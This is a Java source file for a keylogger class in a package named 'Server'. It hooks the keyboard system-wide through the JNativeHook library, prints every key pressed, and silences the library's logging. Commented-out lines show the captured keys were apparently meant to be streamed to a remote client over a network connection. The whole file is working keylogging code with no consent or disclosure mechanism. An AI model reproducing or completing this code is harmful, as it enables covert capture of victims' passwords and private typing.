package Server;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.util.logging.Level;
import java.util.logging.Logger;

public class Keylogger implements NativeKeyListener
{
    public static void main(String[] args)
    {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
//                e.printStackTrace();
            System.exit(-1);
        }
        GlobalScreen.addNativeKeyListener(new Keylogger());

        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);

        logger.setUseParentHandlers(false);
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e)
    {
        String key = NativeKeyEvent.getKeyText(e.getKeyCode());
        if (key.length() > 1) key = "[" + key + "]";

        System.out.println(key);

//            outToClient.println(key);
//            outToClient.flush();
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
    }
}
